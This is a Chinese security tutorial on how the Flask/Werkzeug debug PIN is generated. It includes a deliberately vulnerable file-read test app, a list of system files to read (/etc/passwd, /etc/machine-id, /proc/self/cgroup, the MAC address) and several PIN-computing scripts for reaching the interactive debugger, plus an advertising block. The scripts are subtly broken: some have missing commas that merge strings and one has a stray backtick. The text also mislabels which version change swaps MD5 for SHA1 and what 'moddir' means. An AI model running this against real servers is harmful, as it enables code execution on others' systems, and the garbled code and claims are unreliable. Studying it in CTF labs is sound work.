最近搞SSTI，发现有的开发开了debug，由此想到了PIN，但一直没有对这个点做一个深入剖析，今天就完整的整理Flask Debug
PIN码的生成原理与安全问题。

## PIN是什么？

> PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。
> 您可以使用浏览器中的调试器引脚来启动交互式调试器。
>
> 请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。
>
> 调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。
>
> ——来自StackOverFlow回答

werkzeug不同版本以及python不同版本都会影响PIN码的生成

但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法

## 探寻PIN码生成算法

笔者环境

  * Python 3.10.2

  * Flask 2.0.3

  * PyCharm 2021.3.3 (Professional Edition)

  * Windows 10 专业版 21H2

  * Docker Desktop 4.7.0

先写一个简单的Flask测试程序

    
    
    from flask import Flask  
    app = Flask(__name__)  
    ​  
    ​  
    @app.route("/")  
    def hello():  
    return '合天网安实验室-实践型网络安全在线学习平台；真实环境，在线实操学网络安全。'  
    ​  
    ​  
    if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=8080, debug=True)  
    ​

运行，控制台状态如下

![Flask_Debug_PIN_1.png](https://image.3001.net/images/20220801/1659342730_62e78f8a2ef62321094fe.png!small)

浏览器如下则成功

![Flask_Debug_PIN_2.png](https://image.3001.net/images/20220801/1659342731_62e78f8b72b763c835170.png!small)

接下来开始调试程序，顺藤摸瓜找到生成PIN码的函数

PIN码是werkzeug的策略，先找到flask中导入werkzeug的部分

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

### 调试

在run.app行下断点，点击调试

![Flask_Debug_PIN_3.png](https://image.3001.net/images/20220801/1659342732_62e78f8c9b338f11d966e.png!small)

点击步入

![Flask_Debug_PIN_4.png](https://image.3001.net/images/20220801/1659342734_62e78f8e547d05dc70810.png!small)

转到了flask/app.py，直接Ctrl+F搜索werkzeug

![Flask_Debug_PIN_5.png](https://image.3001.net/images/20220801/1659342735_62e78f8f85788ba378743.png!small)

发现程序从werkzeug导入了run_simple模块，而且try部分有run app的参数

我们直接按住ctrl点击run_simple进去看看

此时进入了seving.py，找到了负责Debug的部分，PIN码是在debug状态下才有的，那这个部分很有可能存有PIN码生成部分，进去看看

![Flask_Debug_PIN_6.png](https://image.3001.net/images/20220801/1659342736_62e78f90e21543533efa5.png!small)

此时进入了__init__.py，经过一番审计，先来看一看pin函数

![Flask_Debug_PIN_7.png](https://image.3001.net/images/20220801/1659342738_62e78f9235bd5e8674247.png!small)

主要是get_pin_and_cookie_name函数，进去看看

    
    
    def get_pin_and_cookie_name(  
    app: "WSGIApplication",  
    ) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:  
    """Given an application object this returns a semi-stable 9 digit pin  
    code and a random key.  The hope is that this is stable between  
    restarts to not make debugging particularly frustrating.  If the pin  
    was forcefully disabled this returns `None`.  
    ​  
    Second item in the resulting tuple is the cookie name for remembering.  
    """  
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")  
    rv = None  
    num = None  
    ​  
    # Pin was explicitly disabled  
    if pin == "off":  
    return None, None  
    ​  
    # Pin was provided explicitly  
    if pin is not None and pin.replace("-", "").isdigit():  
    # If there are separators in the pin, return it directly  
    if "-" in pin:  
    rv = pin  
    else:  
    num = pin  
    ​  
    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)  
    username: t.Optional[str]  
    ​  
    try:  
    # getuser imports the pwd module, which does not exist in Google  
    # App Engine. It may also raise a KeyError if the UID does not  
    # have a username, such as in Docker.  
    username = getpass.getuser()  
    except (ImportError, KeyError):  
    username = None  
    ​  
    mod = sys.modules.get(modname)  
    ​  
    # This information only exists to make the cookie unique on the  
    # computer, not as a security feature.  
    probably_public_bits = [  
    username,  
    modname,  
    getattr(app, "__name__", type(app).__name__),  
    getattr(mod, "__file__", None),  
    ]  
    ​  
    # This information is here to make it harder for an attacker to  
    # guess the cookie name.  They are unlikely to be contained anywhere  
    # within the unauthenticated debug page.  
    private_bits = [str(uuid.getnode()), get_machine_id()]  
    ​  
    h = hashlib.sha1()  
    for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
    continue  
    if isinstance(bit, str):  
    bit = bit.encode("utf-8")  
    h.update(bit)  
    h.update(b"cookiesalt")  
    ​  
    cookie_name = f"__wzd{h.hexdigest()[:20]}"  
    ​  
    # If we need to generate a pin we salt it a bit more so that we don't  
    # end up with the same value and generate out 9 digits  
    if num is None:  
    h.update(b"pinsalt")  
    num = f"{int(h.hexdigest(), 16):09d}"[:9]  
    ​  
    # Format the pincode in groups of digits for easier remembering if  
    # we don't have a result yet.  
    if rv is None:  
    for group_size in 5, 4, 3:  
    if len(num) % group_size == 0:  
        rv = "-".join(  
            num[x : x + group_size].rjust(group_size, "0")  
            for x in range(0, len(num), group_size)  
        )  
        break  
    else:  
    rv = num  
    ​  
    return rv, cookie_name

返回的rv就是PIN码，但这个函数核心是将列表里的值hash，我们不需要去读懂这段代码，只需要将列表里的值填上直接运行代码就行。

### 生成要素：

> #### username
>
> 通过getpass.getuser()读取，通过文件读取`/etc/passwd`
>
> #### modname
>
> 通过getattr(mod,“ **file** ”,None)读取，默认值为flask.app
>
> #### appname
>
> 通过getattr(app,“ **name** ”,type(app). **name** )读取，默认值为Flask
>
> #### moddir
>
> 当前网络的mac地址的十进制数，通过getattr(mod,“ **file** ”,None)读取实际应用中通过报错读取
>
> #### uuidnode
>
> 通过uuid.getnode()读取，通过文件`/sys/class/net/eth0/address`得到16进制结果，转化为10进制进行计算
>
> #### machine_id
>
> 每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：1./etc/machine-id
> 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup

当这6个值我们可以获取到时，就可以推算出生成的PIN码

### 生成算法

修改一下就是PIN生成算法

    
    
    import hashlib  
    from itertools import chain  
    ​  
    probably_public_bits = [  
    'root',  # username  
    'flask.app',  # modname  
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))  
    '/usr/local/lib/python3.7/site-packages/flask/app.py'  # getattr(mod, '__file__', None),  
    ]  
    ​  
    # This information is here to make it harder for an attacker to  
    # guess the cookie name.  They are unlikely to be contained anywhere  
    # within the unauthenticated debug page.  
    private_bits = [  
    '2485377957890',  # str(uuid.getnode()),  /sys/class/net/ens33/address  
    # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup  
    '861c92e8075982bcac4a021de9795f6e3291673c8c872ca3936bcaa8a071948b'  
    ]  
    ​  
    h = hashlib.sha1()  
    for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
    continue  
    if isinstance(bit, str):  
    bit = bit.encode("utf-8")  
    h.update(bit)  
    h.update(b"cookiesalt")  
    ​  
    cookie_name = f"__wzd{h.hexdigest()[:20]}"  
    ​  
    # If we need to generate a pin we salt it a bit more so that we don't  
    # end up with the same value and generate out 9 digits  
    num = None  
    if num is None:  
    h.update(b"pinsalt")  
    num = f"{int(h.hexdigest(), 16):09d}"[:9]  
    ​  
    # Format the pincode in groups of digits for easier remembering if  
    # we don't have a result yet.  
    rv = None  
    if rv is None:  
    for group_size in 5, 4, 3:  
    if len(num) % group_size == 0:  
    rv = "-".join(  
        num[x: x + group_size].rjust(group_size, "0")  
        for x in range(0, len(num), group_size)  
    )  
    break  
    else:  
    rv = num  
    ​  
    print(rv)

然后这里还有一个点，python不同版本的算法区别

### 不同版本算法区别

3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同

3.6 MD5

    
    
    #MD5  
    import hashlib  
    from itertools import chain  
    probably_public_bits = [  
    'flaskweb'  
    'flask.app',  
    'Flask',  
    '/usr/local/lib/python3.7/site-packages/flask/app.py'  
    ]  
    ​  
    private_bits = [  
    '25214234362297',  
    '0402a7ff83cc48b41b227763d03b386cb`0540585c82f3b99aa3ad120ae69ebaa']  
    ​  
    h = hashlib.md5()  
    for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
    continue  
    if isinstance(bit, str):  
    bit = bit.encode('utf-8')  
    h.update(bit)  
    h.update(b'cookiesalt')  
    ​  
    cookie_name = '__wzd' + h.hexdigest()[:20]  
    ​  
    num = None  
    if num is None:  
    h.update(b'pinsalt')  
    num = ('%09d' % int(h.hexdigest(), 16))[:9]  
    ​  
    rv =None  
    if rv is None:  
    for group_size in 5, 4, 3:  
    if len(num) % group_size == 0:  
    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')  
              for x in range(0, len(num), group_size))  
    break  
    else:  
    rv = num  
    ​  
    print(rv)

3.8 SHA1

    
    
    #sha1  
    import hashlib  
    from itertools import chain  
    probably_public_bits = [  
      'root'  
      'flask.app',  
      'Flask',  
      '/usr/local/lib/python3.8/site-packages/flask/app.py'  
    ]  
    ​  
    private_bits = [  
      '2485377581187',  
      '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'  
    ]  
    ​  
    h = hashlib.sha1()  
    for bit in chain(probably_public_bits, private_bits):  
      if not bit:  
          continue  
      if isinstance(bit, str):  
          bit = bit.encode('utf-8')  
      h.update(bit)  
    h.update(b'cookiesalt')  
    ​  
    cookie_name = '__wzd' + h.hexdigest()[:20]  
    ​  
    num = None  
    if num is None:  
      h.update(b'pinsalt')  
      num = ('%09d' % int(h.hexdigest(), 16))[:9]  
    ​  
    rv =None  
    if rv is None:  
      for group_size in 5, 4, 3:  
          if len(num) % group_size == 0:  
              rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')  
                            for x in range(0, len(num), group_size))  
              break  
      else:  
          rv = num  
    ​  
    print(rv)

其实最稳妥的方法就是自己调试，把自己版本的生成PIN部分提取出来，把num和rv改成None，直接print rv就行

### docker测试

本地docker在Windows上

我们将上面的测试代码修改为下，加入文件读取功能，并且return 0当我们传值错误可出发debug模式

    
    
    from flask import Flask, request  
    app = Flask(__name__)  
    ​  
    ​  
    @app.route("/")  
    def hello():  
    return '合天网安实验室-实践型网络安全在线学习平台；真实环境，在线实操学网络安全。'  
    ​  
    ​  
    @app.route("/file")  
    def file():  
    filename = request.args.get('filename')  
    try:  
    with open(filename, 'r') as f:  
    return f.read()  
    except:  
    return 0  
    ​  
    ​  
    if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=9000, debug=True)

回到我们的环境，模块路径通过传入错误文件名触发报错可得到，主要就是machine-id，其他部分直接出的就不用看了，docker环境只需要后俩

![Flask_Debug_PIN_8.png](https://image.3001.net/images/20220801/1659342739_62e78f936024faa6be86d.png!small)

![Flask_Debug_PIN_9.png](https://image.3001.net/images/20220801/1659342740_62e78f9478cc9e6fc498e.png!small)

拼接起来，代入程序，直接运行

![Flask_Debug_PIN_10.png](https://image.3001.net/images/20220801/1659342741_62e78f9585b7a8884c6dc.png!small)

与环境里的一致

![Flask_Debug_PIN_11.png](https://image.3001.net/images/20220801/1659342742_62e78f96980936ae66590.png!small)

如果大家嫌开环境麻烦这里推荐两个线上靶场，这俩都是计算PIN

  * [GYCTF2020]FlaskApp——BUUCTF

  * web801——CTFshow

  *  **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

